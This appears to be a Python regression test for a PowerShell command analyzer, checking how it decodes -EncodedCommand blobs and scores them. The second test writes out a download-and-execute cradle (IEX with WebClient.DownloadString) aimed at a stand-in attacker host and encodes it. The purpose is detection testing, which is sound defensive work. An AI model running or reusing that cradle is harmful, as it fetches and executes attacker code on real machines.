"""Golden regression test — PowerShell -EncodedCommand semantic decode.

Mandatory per user spec: any regression in EncodedCommand handling
must be caught before it reaches production.
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from v2.semantic.ps_semantic import analyze  # noqa: E402


GOLDEN_INPUT = (
    "powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass "
    "-EncodedCommand "
    "UwB0AGEAcgB0ACAAIgBoAHQAdABwADoALwAvADEAMgA3AC4AMAAuADAALgAxADoA"
    "NAAwADkANgAvACIA"
)


def test_encodedcommand_semantic_decode_matches_spec() -> None:
    r = analyze(GOLDEN_INPUT)

    # 1. Full decode succeeded
    assert r.detected, "EncodedCommand blob was not detected/decoded"
    assert r.decode_outcome == "fully_decoded", (
        f"expected decode_outcome=fully_decoded, got {r.decode_outcome!r}")

    # 2. Recovered script contains the Start-Process invocation
    assert "Start" in r.recovered_script
    assert "http://127.0.0.1:4096/" in r.recovered_script

    # 3. AST — alias normalization: Start → Start-Process
    assert r.ast, "AST is empty"
    step0 = r.ast[0]
    assert step0["cmdlet"] == "Start-Process", (
        f"alias not normalized: {step0['cmdlet']!r}")
    assert step0["alias"] == "Start"
    assert "http://127.0.0.1:4096/" in step0["args"]

    # 4. Host classification — loopback, NOT external
    urls = [a for a in r.artifacts if a.kind == "url"]
    hosts = [a for a in r.artifacts if a.kind == "host"]
    ips = [a for a in r.artifacts if a.kind == "ip"]
    assert urls and urls[0].classification == "loopback"
    assert hosts and hosts[0].value == "127.0.0.1" and hosts[0].classification == "loopback"
    assert ips  and ips[0].classification == "loopback"

    # 5. Behavior — Open Local Service, NOT "Executes Base64 encoded PowerShell"
    cats = [b["category"] for b in r.behaviors]
    assert "Open Local Service" in cats, (
        f"expected 'Open Local Service' in behaviors, got {cats}")
    # And NEVER these false positives
    forbidden_cats = {"External Network Communication", "Memory Injection",
                      "Persistence", "Credential Access", "Download"}
    assert not (set(cats) & forbidden_cats), (
        f"false-positive behavior categories present: {set(cats) & forbidden_cats}")

    # 6. Verdict — Informational (or Benign), NOT Malicious
    assert r.verdict == "informational", (
        f"expected verdict=informational, got {r.verdict!r} (risk={r.risk_score})")
    assert r.risk_score < 30, f"risk score too high: {r.risk_score}"

    # 7. MITRE — behavior-driven, NOT T1027 on encoding alone
    assert "T1027" not in r.mitre_ids, "T1027 MUST NOT fire on EncodedCommand alone"
    assert "T1027.010" not in r.mitre_ids
    assert "T1071.001" not in r.mitre_ids, "T1071.001 (Web C2) MUST NOT fire on loopback"

    # 8. Confidence populated
    assert 50 <= r.confidence <= 100


def test_download_and_execute_scores_malicious() -> None:
    """Complementary spec: DownloadString + IEX MUST score malicious."""
    # `IEX (New-Object System.Net.WebClient).DownloadString('http://evil.com/x.ps1')`
    import base64
    ps_script = ("IEX (New-Object System.Net.WebClient)"
                 ".DownloadString('http://evil.example.com/x.ps1')")
    blob = base64.b64encode(ps_script.encode("utf-16-le")).decode()
    cmdline = f"powershell.exe -NoP -Enc {blob}"
    r = analyze(cmdline)
    assert r.detected
    assert r.verdict in ("malicious", "suspicious"), (
        f"expected verdict>=suspicious, got {r.verdict!r} (risk={r.risk_score})")
    cats = {b["category"] for b in r.behaviors}
    assert "Download" in cats, f"expected Download behavior, got {cats}"
    assert "Script Execution" in cats, f"expected Script Execution (IEX), got {cats}"
    assert "T1105" in r.mitre_ids, "T1105 (Download) should fire for DownloadString"
    assert "T1059.001" in r.mitre_ids


if __name__ == "__main__":
    test_encodedcommand_semantic_decode_matches_spec()
    test_download_and_execute_scores_malicious()
    print("✅ Both golden PS EncodedCommand tests passed.")
